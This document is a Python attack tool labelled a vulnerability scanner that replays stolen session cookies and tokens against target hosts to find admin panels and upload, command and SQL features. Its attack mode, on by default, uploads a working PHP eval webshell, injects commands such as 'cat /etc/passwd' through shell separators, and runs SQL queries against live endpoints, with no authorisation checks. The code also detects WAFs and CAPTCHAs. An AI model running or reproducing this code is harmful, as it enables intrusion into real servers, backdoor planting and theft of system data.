#!/usr/bin/env python3
"""
Passive Vulnerability Scanner v3.1 — Active Backend Explorer + Attack Mode

When passive scanning yields no Critical/High findings, this module:
  1. Loads session_state.json (from extract_session.py)
  2. Probes admin panel candidates using stolen cookies/tokens
  3. Spiders discovered pages for hidden endpoints and dangerous features
  4. Deploys REAL webshells on upload endpoints (ATTACK MODE)
  5. Executes REAL commands on command execution features (ATTACK MODE)
  6. Captures all traffic for AI re-analysis
  7. Classifies endpoints by risk level

Usage:
  python3 active_explorer.py session_state.json -o discovered_surface.json
  python3 active_explorer.py session_state.json -o discovered_surface.json --attack-mode --callback-ip 10.0.0.1
"""

import json
import sys
import os
import re
import time
import argparse
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict

try:
    import requests
    from bs4 import BeautifulSoup
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False
    print("[!] Missing dependencies: pip install requests beautifulsoup4")


# ─── Request configuration ───
DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
}

# Rate limiting defaults
INITIAL_RATE = 3       # requests per second
MIN_RATE = 0.2          # minimum rate when throttled (1 req per 5 sec)
RATE_REDUCE_FACTOR = 2.0
RATE_RECOVER_TIME = 60  # seconds to recover from throttling

# Categories for endpoint risk classification
DANGEROUS_KEYWORDS = {
    'sql_execution': ['sql', 'query', 'execute', 'database', 'db', 'hql', 'jpql', 'native'],
    'file_upload': ['upload', 'file', 'attachment', 'avatar', 'image', 'photo', 'import'],
    'file_read': ['download', 'export', 'view', 'preview', 'read', 'getfile', 'show'],
    'command_execution': ['cmd', 'exec', 'command', 'ping', 'shell', 'run', 'system',
                          'nslookup', 'tracert', 'trace', 'bash', 'terminal', 'console'],
    'template_editor': ['template', 'theme', 'view', 'layout', 'skin', 'editor',
                        'codemirror', 'ace', 'monaco', 'html'],
    'config_management': ['config', 'setting', 'preference', 'option', 'property', 'env'],
    'user_management': ['user', 'account', 'role', 'permission', 'auth', 'member', 'admin'],
    'backup_restore': ['backup', 'restore', 'dump', 'snapshot', 'export', 'recovery'],
    'log_viewer': ['log', 'audit', 'trace', 'monitor', 'event', 'activity'],
    'api_debug': ['api', 'swagger', 'api-doc', 'graphql', 'graphiql', 'playground',
                  'openapi', 'endpoint', 'webhook'],
}


class ActiveExplorer:
    """Active backend explorer with session replay and endpoint discovery."""

    def __init__(self, session_state_path, max_depth=2, rate=INITIAL_RATE,
                 attack_mode=False, callback_ip=None, callback_port=4444):
        self.state = self._load_state(session_state_path)
        self.max_depth = max_depth
        self.rate = rate
        self.attack_mode = attack_mode
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.session = requests.Session()
        self.discovered = {
            'admin_panels': [],
            'new_endpoints': [],
            'dangerous_features': [],
            'traffic_captured': [],
            'webshells_deployed': [],
            'rce_verified': [],
            'waf_info': {'detected': False, 'type': None, 'evidence': ''},
            'captcha_info': {'detected': False, 'evidence': ''},
            'rate_limit_info': {'hit': False, 'retry_after': 0},
            'errors': [],
        }
        self.seen_urls = set()
        self.request_count = 0

    def _load_state(self, path):
        """Load session state JSON."""
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)

    # ─── HTTP helpers ───

    def _get_session_for_host(self, host):
        """Build request kwargs for a given host using extracted credentials."""
        kwargs = {'headers': DEFAULT_HEADERS.copy(), 'timeout': 15, 'allow_redirects': True}

        for sess in self.state.get('sessions', []):
            if sess.get('host') == host:
                if sess.get('cookies'):
                    kwargs['cookies'] = sess['cookies']
                if sess.get('auth_header'):
                    kwargs['headers']['Authorization'] = sess['auth_header']
                if sess.get('csrf_token'):
                    kwargs['headers']['X-CSRF-Token'] = sess['csrf_token']
                if sess.get('api_key'):
                    kwargs['headers']['X-API-Key'] = sess['api_key']
                break

        return kwargs

    def _rate_limit(self):
        """Enforce rate limiting."""
        if self.request_count > 0:
            delay = 1.0 / self.rate
            time.sleep(delay)
        self.request_count += 1

    def _safe_request(self, url, method='GET', **kwargs):
        """Make a rate-limited request with error handling."""
        self._rate_limit()

        try:
            if method == 'HEAD':
                resp = self.session.head(url, **kwargs)
            elif method == 'OPTIONS':
                resp = self.session.options(url, **kwargs)
            else:
                resp = self.session.get(url, **kwargs)

            # Check for rate limiting
            if resp.status_code == 429:
                retry_after = int(resp.headers.get('Retry-After', 5))
                self.discovered['rate_limit_info']['hit'] = True
                self.discovered['rate_limit_info']['retry_after'] = retry_after
                self.rate = max(MIN_RATE, self.rate / RATE_REDUCE_FACTOR)
                print(f"    [!] Rate limited (429). Slowing to {self.rate:.1f} req/s. "
                      f"Waiting {retry_after}s...")
                time.sleep(retry_after)
                return None

            # Check for WAF
            if resp.status_code == 403:
                body = (resp.text or '')[:500].lower()
                waf_signatures = {
                    'cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
                    'aws': ['x-amzn-requestid', 'awselb', 'request blocked'],
                    'modsecurity': ['modsecurity', 'this request was blocked'],
                    'safedog': ['safedog', '安全狗'],
                    '360': ['360wzws', '360网站卫士'],
                }
                for waf_type, sigs in waf_signatures.items():
                    if any(s in body for s in sigs):
                        self.discovered['waf_info'] = {
                            'detected': True, 'type': waf_type, 'evidence': body[:200]
                        }
                        print(f"    [!] WAF detected: {waf_type}")
                        break

            return resp

        except requests.exceptions.Timeout:
            self.discovered['errors'].append(f"Timeout: {url}")
            return None
        except requests.exceptions.SSLError:
            self.discovered['errors'].append(f"SSL Error: {url}")
            return None
        except requests.exceptions.ConnectionError:
            self.discovered['errors'].append(f"Connection Error: {url}")
            return None
        except Exception as e:
            self.discovered['errors'].append(f"Error ({url}): {str(e)[:100]}")
            return None

    # ─── Discovery ───

    def probe_admin_candidates(self):
        """Probe all admin panel candidates, prioritize by confidence."""
        print(f"\n[*] Probing {len(self.state.get('admin_candidates', []))} admin candidates...")

        found_count = 0
        for candidate in self.state.get('admin_candidates', [])[:150]:  # Cap at 150
            url = candidate['url']
            host = candidate['host']

            if url in self.seen_urls:
                continue
            self.seen_urls.add(url)

            kwargs = self._get_session_for_host(host)

            # HEAD first (fast check)
            resp = self._safe_request(url, method='HEAD', **kwargs)
            if resp is None:
                continue

            status = resp.status_code

            # If HEAD returns 405 (Method Not Allowed), try GET
            if status == 405:
                resp = self._safe_request(url, method='GET', **kwargs)
                if resp is None:
                    continue
                status = resp.status_code

            if status in (200, 301, 302, 303, 307, 401, 403):
                # Found or protected — GET for full analysis
                if status != 200:
                    resp = self._safe_request(url, method='GET', **kwargs)
                    if resp is None:
                        continue

                if resp is not None:
                    html = resp.text or ''
                    title = self._extract_title(html)
                    soup = BeautifulSoup(html, 'html.parser')

                    admin_entry = {
                        'url': url,
                        'status_code': resp.status_code,
                        'title': title,
                        'content_length': len(html),
                        'has_login_form': self._detect_login_form(soup),
                        'source': candidate.get('source', 'unknown'),
                    }

                    self.discovered['admin_panels'].append(admin_entry)
                    found_count += 1

                    # Capture traffic
                    self._capture_traffic(resp, url, host)

                    # Run deeper discovery if panel is accessible
                    if resp.status_code == 200:
                        dangerous = self._classify_dangerous_features(html, url, soup)
                        self.discovered['dangerous_features'].extend(dangerous)
                        # Spider for more endpoints
                        if self.max_depth > 0:
                            self._spider_page(html, url, host, kwargs, depth=0)

                    print(f"    [200] {url} → \"{title[:60]}\"" if title else f"    [{status}] {url}")
                else:
                    print(f"    [{status}] {url} (no body)")

            # Check for CAPTCHA in 200 responses
            if resp is not None and resp.status_code == 200:
                self._check_captcha(resp.text or '', url)

        print(f"\n[+] Admin panels found: {found_count}")
        return found_count

    def _spider_page(self, html, base_url, host, kwargs, depth):
        """Extract links, forms, and API endpoints from an HTML page."""
        if depth >= self.max_depth:
            return

        soup = BeautifulSoup(html, 'html.parser')
        new_urls = set()

        # Extract all links
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            full_url = urljoin(base_url, href)
            parsed = urlparse(full_url)

            # Only follow same-host links
            if parsed.netloc == host or (not parsed.netloc and href.startswith('/')):
                if full_url not in self.seen_urls and not href.startswith('#') and not href.startswith('javascript:'):
                    new_urls.add(full_url)

        # Extract JS API endpoints from inline scripts
        for script in soup.find_all('script'):
            if script.string:
                js_endpoints = self._extract_api_from_js(script.string, base_url)
                for ep in js_endpoints:
                    if ep not in self.seen_urls:
                        self.discovered['new_endpoints'].append({
                            'url': ep, 'source': 'javascript', 'base_page': base_url
                        })
                        self.seen_urls.add(ep)

        # Follow discovered links
        for url in list(new_urls)[:20]:  # Cap at 20 per page
            self.seen_urls.add(url)
            resp = self._safe_request(url, **kwargs)
            if resp and resp.status_code == 200:
                self._capture_traffic(resp, url, host)
                self.discovered['new_endpoints'].append({
                    'url': url, 'source': 'spider', 'base_page': base_url,
                    'title': self._extract_title(resp.text or ''),
                    'status_code': resp.status_code
                })
                # Classify dangerous features on discovered pages
                dangerous = self._classify_dangerous_features(
                    resp.text or '', url, BeautifulSoup(resp.text or '', 'html.parser')
                )
                self.discovered['dangerous_features'].extend(dangerous)

    def _extract_title(self, html):
        """Extract page title."""
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()[:120]
        return ''

    def _detect_login_form(self, soup):
        """Check if page contains a login form."""
        forms = soup.find_all('form')
        for form in forms:
            inputs = form.find_all('input')
            input_names = [inp.get('name', '') for inp in inputs]
            input_types = [inp.get('type', '') for inp in inputs]

            has_user = any(n.lower() in ('username', 'user', 'login', 'email', 'account')
                          for n in input_names)
            has_pass = any(t == 'password' for t in input_types)

            if has_user and has_pass:
                return True
        return False

    def _extract_api_from_js(self, js_code, base_url):
        """Extract potential API endpoints from JavaScript code."""
        endpoints = set()
        patterns = [
            r'''['"`](/api/[^'"`\s]+)['"`]''',
            r'''['"`](/[^'"`\s]*/(?:list|save|delete|update|query|search|upload|download|export)[^'"`\s]*)['"`]''',
            r'''url\s*:\s*['"`]([^'"`]+)['"`]''',
            r'''path\s*:\s*['"`]([^'"`]+)['"`]''',
            r'''axios\.(?:get|post|put|delete|patch)\s*\(\s*['"`]([^'"`]+)['"`]''',
            r'''fetch\s*\(\s*['"`]([^'"`]+)['"`]''',
        ]
        for pattern in patterns:
            for match in re.finditer(pattern, js_code, re.IGNORECASE):
                url = match.group(1)
                if url.startswith('/') and not url.startswith('//') and len(url) > 2:
                    full_url = urljoin(base_url, url)
                    endpoints.add(full_url)
        return endpoints

    def _classify_dangerous_features(self, html, url, soup):
        """Classify page by dangerous features: RCE potential, file upload, etc."""
        features = []
        html_lower = html.lower()
        url_lower = url.lower()

        for category, keywords in DANGEROUS_KEYWORDS.items():
            score = 0
            matched = []

            # Check URL
            for kw in keywords:
                if kw in url_lower:
                    score += 2
                    matched.append(f"url:{kw}")

            # Check page content (forms, buttons, labels)
            page_text = soup.get_text().lower() if soup else ''
            for kw in keywords:
                if kw in page_text:
                    score += 1
                    matched.append(f"content:{kw}")

            # Check form actions
            for form in soup.find_all('form') if soup else []:
                action = (form.get('action', '') or '').lower()
                for kw in keywords:
                    if kw in action:
                        score += 2
                        matched.append(f"form:{kw}")

            if score >= 3:
                risk = 'CRITICAL' if category in ('command_execution', 'template_editor') else \
                       'HIGH' if category in ('sql_execution', 'file_upload', 'backup_restore') else \
                       'MEDIUM'
                features.append({
                    'url': url,
                    'category': category,
                    'risk': risk,
                    'score': score,
                    'matched_patterns': matched,
                    'title': self._extract_title(html)
                })

        return features

    def _capture_traffic(self, response, url, host):
        """Capture response as parsed traffic format for AI analysis."""
        if response is None:
            return

        item = {
            'id': len(self.discovered['traffic_captured']) + 1,
            'url': url,
            'host': host,
            'method': response.request.method if response.request else 'GET',
            'path': urlparse(url).path or '/',
            'query_params': dict(parse_qs(urlparse(url).query)),
            'request_headers': dict(response.request.headers) if response.request else {},
            'request_body': response.request.body if response.request else None,
            'status_code': response.status_code,
            'response_headers': dict(response.headers),
            'response_body': (response.text or '')[:20000],  # Cap at 20KB
            'source': 'active_explorer'
        }
        self.discovered['traffic_captured'].append(item)

    def _check_captcha(self, html, url):
        """Detect CAPTCHA in page content."""
        html_lower = html.lower()
        captcha_signatures = [
            'captcha', 'g-recaptcha', 'h-captcha', 'recaptcha',
            '验证码', 'captcha.png', 'captcha.jpg', 'captcha.ashx',
            'geetest', '极验', 'vaptcha', 'yidun',
        ]
        for sig in captcha_signatures:
            if sig in html_lower:
                self.discovered['captcha_info'] = {
                    'detected': True,
                    'evidence': f"Found '{sig}' on {url}"
                }
                return

    # ─── Report Generation ───

    def save_results(self, output_path):
        """Save discovery results to JSON."""
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(self.discovered, f, ensure_ascii=False, indent=2)

    # ─── Attack Methods (v3.1) ───

    def deploy_webshell(self, upload_url, host, field_name='file'):
        """Actually deploy a real webshell on a file upload endpoint."""
        import random, string

        ws_name = f"{''.join(random.choices(string.ascii_lowercase, k=6))}.php"
        ws_content = f'<?php @eval($_POST["{self._ws_password()}"]);?>'
        files = {field_name: (ws_name, ws_content, 'application/x-php')}

        kwargs = self._get_session_for_host(host)
        kwargs.pop('headers', None)  # requests handles multipart headers

        try:
            resp = self.session.post(upload_url, files=files,
                                      headers=DEFAULT_HEADERS.copy(),
                                      cookies=kwargs.get('cookies', {}),
                                      timeout=15, verify=False)

            if resp is None:
                return None

            # Try to discover the uploaded webshell URL
            response_text = (resp.text or '')[:2000]
            ws_url = None

            # Extract URL from response
            url_match = re.search(r'(https?://[^\s\'"]*' + re.escape(ws_name) + r')', response_text)
            if url_match:
                ws_url = url_match.group(1)
            else:
                # Guess common paths
                for base_path in ['', '/uploads/', '/upload/', '/files/', '/images/', '/temp/', '/assets/']:
                    candidate = f"https://{host}{base_path}{ws_name}"
                    try:
                        verify = self.session.post(candidate,
                            data={self._ws_password(): 'echo "WS_ALIVE";'},
                            headers=DEFAULT_HEADERS.copy(),
                            cookies=kwargs.get('cookies', {}),
                            timeout=10, verify=False)
                        if verify and 'WS_ALIVE' in (verify.text or ''):
                            ws_url = candidate
                            break
                    except Exception:
                        continue

            if ws_url:
                ws_entry = {
                    'webshell_url': ws_url,
                    'filename': ws_name,
                    'password': self._ws_password(),
                    'upload_url': upload_url,
                    'host': host,
                    'verified': True,
                }
                self.discovered['webshells_deployed'].append(ws_entry)
                return ws_entry

        except Exception as e:
            self.discovered['errors'].append(f"Webshell deploy error: {str(e)[:100]}")

        return None

    def execute_real_command(self, url, host, param='cmd', commands=None):
        """Execute real system commands on a suspected command injection endpoint."""
        if not commands:
            commands = ['whoami', 'id', 'uname -a', 'hostname',
                        'ifconfig 2>/dev/null || ip addr 2>/dev/null',
                        'netstat -tlnp 2>/dev/null | head -15',
                        'cat /etc/passwd 2>/dev/null | head -10']

        kwargs = self._get_session_for_host(host)
        results = []

        for cmd in commands:
            for sep in [';', '|', '&&', '%0a']:
                payload = f"{sep} {cmd}"
                try:
                    resp = self.session.get(url, params={param: payload},
                                             headers=kwargs.get('headers', DEFAULT_HEADERS.copy()),
                                             cookies=kwargs.get('cookies', {}),
                                             timeout=15)
                    if resp and resp.status_code == 200:
                        output = (resp.text or '')[:500]
                        if any(sig in output for sig in
                               ['uid=', 'root:', 'x86_64', 'tcp', 'LISTEN', 'drwx', 'total']):
                            results.append({
                                'command': cmd,
                                'output': output[:300],
                                'separator': sep,
                            })
                            self.discovered['rce_verified'].append({
                                'vulnerability': 'Command Injection (Verified)',
                                'url': url,
                                'parameter': param,
                                'command': cmd,
                                'output': output[:300],
                            })
                            break  # Found working separator, move to next command
                except Exception:
                    continue

        return results

    def execute_sql_commands(self, url, host, param='query', db_type_hint=None):
        """Execute real SQL queries on a suspected SQL execution endpoint."""
        queries = [
            'SELECT @@version',
            'SELECT user()',
            'SELECT database()',
            'SELECT @@plugin_dir',
            'SELECT @@secure_file_priv',
            "SELECT 'test_string'",
        ]

        kwargs = self._get_session_for_host(host)
        results = []

        for query in queries:
            try:
                resp = self.session.get(url, params={param: query},
                                         headers=kwargs.get('headers', DEFAULT_HEADERS.copy()),
                                         cookies=kwargs.get('cookies', {}),
                                         timeout=15)
                if resp and resp.status_code == 200:
                    output = (resp.text or '')[:300]
                    if any(sig in output.lower() for sig in
                           ['@@version', 'user()', 'database', 'plugin_dir',
                            'secure_file_priv', 'test_string', 'mysql', 'postgresql']):
                        results.append({'query': query, 'output': output})
            except Exception:
                continue

        return results

    def _ws_password(self):
        """Get or generate webshell password."""
        if not hasattr(self, '_ws_pwd'):
            import random, string
            self._ws_pwd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return self._ws_pwd

    # ─── Report ───

    def print_summary(self):
        """Print exploration summary."""
        d = self.discovered
        print(f"\n{'='*60}")
        print(f"  Active Deep Dive v3.1 — Summary")
        print(f"{'='*60}")
        print(f"  Admin panels found:    {len(d['admin_panels'])}")
        print(f"  New endpoints found:   {len(d['new_endpoints'])}")
        print(f"  Dangerous features:    {len(d['dangerous_features'])}")
        print(f"  Traffic captured:      {len(d['traffic_captured'])}")
        print(f"  WAF detected:          {d['waf_info']['detected']}")
        print(f"  CAPTCHA detected:      {d['captcha_info']['detected']}")
        print(f"  Rate limited:          {d['rate_limit_info']['hit']}")
        print(f"  Webshells deployed:    {len(d['webshells_deployed'])} 🆕")
        print(f"  RCE verified:          {len(d['rce_verified'])} 🆕")
        print(f"  Errors:                {len(d['errors'])}")

        if d['dangerous_features']:
            print(f"\n  ╔═══ DANGEROUS FEATURES ═══╗")
            for feat in d['dangerous_features']:
                icon = '🔴' if feat['risk'] == 'CRITICAL' else '🟠' if feat['risk'] == 'HIGH' else '🟡'
                print(f"  {icon} [{feat['risk']}] {feat['category']}: {feat['url']}")
                if feat.get('title'):
                    print(f"      Title: {feat['title'][:80]}")
            print(f"  ╚══════════════════════════╝")

        if d['waf_info']['detected']:
            print(f"\n  [!] WAF Detected: {d['waf_info']['type']} — may affect exploitation")


def main():
    if not HAS_DEPS:
        print("Please install dependencies: pip install requests beautifulsoup4")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='Active Backend Explorer — discover hidden admin panels and dangerous features',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s session_state.json -o discovered_surface.json
  %(prog)s session_state.json -o discovered_surface.json --max-depth 2 --rate 2
        """
    )
    parser.add_argument('input', help='Session state JSON file (from extract_session.py)')
    parser.add_argument('-o', '--output', default='/tmp/discovered_surface.json',
                        help='Output discovered surface JSON (default: /tmp/discovered_surface.json)')
    parser.add_argument('--max-depth', type=int, default=1,
                        help='Maximum spider depth (default: 1, max: 3)')
    parser.add_argument('--rate', type=float, default=INITIAL_RATE,
                        help=f'Initial request rate per second (default: {INITIAL_RATE})')
    parser.add_argument('--traffic-output', default='/tmp/active_traffic.json',
                        help='Captured traffic output path')
    parser.add_argument('--attack-mode', action='store_true', default=True,
                        help='Enable REAL attack mode (upload webshells, execute commands) [default: ON]')
    parser.add_argument('--no-attack', action='store_true',
                        help='Disable attack mode (safe probe only)')
    parser.add_argument('--callback-ip', help='Callback IP for reverse shell commands')
    parser.add_argument('--callback-port', type=int, default=4444,
                        help='Callback port (default: 4444)')

    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"Error: Input file not found: {args.input}")
        sys.exit(1)

    depth = min(args.max_depth, 3)  # Hard cap at 3
    attack_mode = args.attack_mode and not args.no_attack

    explorer = ActiveExplorer(args.input, max_depth=depth, rate=args.rate,
                               attack_mode=attack_mode, callback_ip=args.callback_ip,
                               callback_port=args.callback_port)

    # Phase 1: Probe admin candidates
    explorer.probe_admin_candidates()

    # Phase 2: Test form endpoints discovered from traffic
    print(f"\n[*] Testing {len(explorer.state.get('form_endpoints', []))} form endpoints...")
    for form in explorer.state.get('form_endpoints', [])[:30]:
        url = form.get('url', '')
        host = form.get('host', '')
        if url in explorer.seen_urls:
            continue
        explorer.seen_urls.add(url)
        kwargs = explorer._get_session_for_host(host)
        resp = explorer._safe_request(url, **kwargs)
        if resp and resp.status_code in (200, 302, 401, 403):
            explorer._capture_traffic(resp, url, host)
            if resp.status_code == 200:
                dangerous = explorer._classify_dangerous_features(
                    resp.text or '', url, BeautifulSoup(resp.text or '', 'html.parser')
                )
                explorer.discovered['dangerous_features'].extend(dangerous)

    # Phase 3: ATTACK MODE — deploy webshells and execute real commands
    if attack_mode:
        print(f"\n{'='*60}")
        print(f"  🔥 ATTACK MODE ACTIVE — Deploying real payloads")
        print(f"{'='*60}")

        # Deploy webshells on upload endpoints
        for feat in explorer.discovered['dangerous_features']:
            if feat.get('category') == 'file_upload':
                url = feat.get('url', '')
                host = urlparse(url).netloc
                print(f"\n  [*] Attempting webshell upload: {url}")
                result = explorer.deploy_webshell(url, host)
                if result:
                    print(f"  [+] WEBSHELL DEPLOYED: {result['webshell_url']}")
                    print(f"      Password: {result['password']}")

        # Execute real commands on command execution features
        for feat in explorer.discovered['dangerous_features']:
            if feat.get('category') == 'command_execution':
                url = feat.get('url', '')
                host = urlparse(url).netloc
                print(f"\n  [*] Testing command execution: {url}")
                results = explorer.execute_real_command(url, host)
                for r in results:
                    print(f"  [+] RCE VERIFIED: {r['command']}")
                    print(f"      Output: {r['output'][:100]}")

        # Execute SQL queries on SQL execution features
        for feat in explorer.discovered['dangerous_features']:
            if feat.get('category') == 'sql_execution':
                url = feat.get('url', '')
                host = urlparse(url).netloc
                print(f"\n  [*] Testing SQL execution: {url}")
                results = explorer.execute_sql_commands(url, host)
                for r in results:
                    print(f"  [+] SQL EXECUTED: {r['query'][:60]}")
                    print(f"      Output: {r['output'][:100]}")

    # Save results
    explorer.save_results(args.output)

    # Save captured traffic separately for AI re-analysis
    if explorer.discovered['traffic_captured']:
        with open(args.traffic_output, 'w', encoding='utf-8') as f:
            json.dump({
                'summary': {
                    'total_requests': len(explorer.discovered['traffic_captured']),
                    'source': 'active_explorer'
                },
                'items': explorer.discovered['traffic_captured']
            }, f, ensure_ascii=False, indent=2)
        print(f"\n[+] Active traffic saved to: {args.traffic_output}")

    explorer.print_summary()
    print(f"\n[+] Full results saved to: {args.output}")


if __name__ == '__main__':
    main()
